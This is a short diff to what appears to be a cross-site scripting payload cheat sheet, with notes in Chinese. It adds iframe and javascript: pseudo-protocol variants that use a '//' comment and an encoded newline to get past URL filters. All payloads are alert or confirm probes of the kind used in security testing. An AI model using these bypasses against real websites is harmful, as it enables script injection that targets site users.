@@ -13,10 +13,16 @@
 
 
 <iframe src=javascript://%0aalert('iframe')>
+<iframe src=javascript://qq.com%0aalert('iframe')>
+//注释当前行，%a换行
 <embed src="https://c0olw.github.io/pic/1.html">
 <audio src=x onerror=confirm("casrc")> 
 
 伪协议：
+javascript:alert(1)
+javascript://comment％0aalert(1)
+//注释当前行，%a换行
+javascript://qq.com%0aalert('iframe')
 javascript://comment％250aalert(1)
 
 <iframe src="javascript:alert(111)"></iframe>  //火狐/IE/谷歌都支持
